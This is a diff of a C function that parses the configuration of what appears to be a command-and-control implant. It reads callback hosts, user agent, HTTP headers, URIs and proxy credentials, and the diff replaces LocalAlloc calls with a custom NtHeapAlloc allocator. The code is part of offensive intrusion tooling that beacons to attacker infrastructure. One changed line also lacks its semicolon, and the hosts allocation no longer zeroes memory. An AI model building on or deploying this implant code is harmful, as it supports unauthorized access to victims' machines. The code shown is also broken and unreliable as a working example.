@@ -69,8 +69,7 @@ VOID ConfigInit()
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Hosts[ i ] = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
-        MemSet( Instance->Config.Transport.Hosts[ i ], 0, Length + sizeof( WCHAR ) );
+        Instance->Config.Transport.Hosts[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) )
         MemCopy( Instance->Config.Transport.Hosts[ i ], Buffer, Length );
 #ifdef DEBUG
         printf( "  - %ls\n", Instance->Config.Transport.Hosts[ i ] );
@@ -89,18 +88,18 @@ VOID ConfigInit()
 
     // UserAgent
     Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.UserAgent = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+    Instance->Config.Transport.UserAgent = NtHeapAlloc( Length + sizeof( WCHAR ) );
     MemCopy( Instance->Config.Transport.UserAgent, Buffer, Length );
     PRINTF( "[CONFIG] UserAgent: %ls\n", Instance->Config.Transport.UserAgent );
 
     // Headers
     J = ParserGetInt32( &Parser );
-    Instance->Config.Transport.Headers = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    Instance->Config.Transport.Headers = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
     PRINTF( "[CONFIG] Headers [%d]:\n", J );
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Headers[ i ] = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+        Instance->Config.Transport.Headers[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
         MemSet( Instance->Config.Transport.Headers[ i ], 0, Length );
         MemCopy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
 #ifdef DEBUG
@@ -111,12 +110,12 @@ VOID ConfigInit()
 
     // Uris
     J = ParserGetInt32( &Parser );
-    Instance->Config.Transport.Uris = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    Instance->Config.Transport.Uris = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
     PRINTF( "[CONFIG] Uris [%d]:\n", J );
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Uris[ i ] = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+        Instance->Config.Transport.Uris[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
         MemSet( Instance->Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
         MemCopy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
 #ifdef DEBUG
@@ -131,14 +130,14 @@ VOID ConfigInit()
     {
         PUTS( "[CONFIG] [PROXY] Enabled" );
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Proxy.Url = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+        Instance->Config.Transport.Proxy.Url = NtHeapAlloc( Length + sizeof( WCHAR ) );
         MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
         PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance->Config.Transport.Proxy.Url );
 
         Buffer = ParserGetBytes( &Parser, &Length );
         if ( Length > 0 )
         {
-            Instance->Config.Transport.Proxy.Username = Instance->Win32.LocalAlloc( LPTR, Length );
+            Instance->Config.Transport.Proxy.Username = NtHeapAlloc( Length );
             MemCopy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
             PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance->Config.Transport.Proxy.Username );
         }
@@ -148,7 +147,7 @@ VOID ConfigInit()
         Buffer = ParserGetBytes( &Parser, &Length );
         if ( Length > 0 )
         {
-            Instance->Config.Transport.Proxy.Password = Instance->Win32.LocalAlloc( LPTR, Length );
+            Instance->Config.Transport.Proxy.Password = NtHeapAlloc( Length );
             MemCopy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
             PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance->Config.Transport.Proxy.Password );
         }
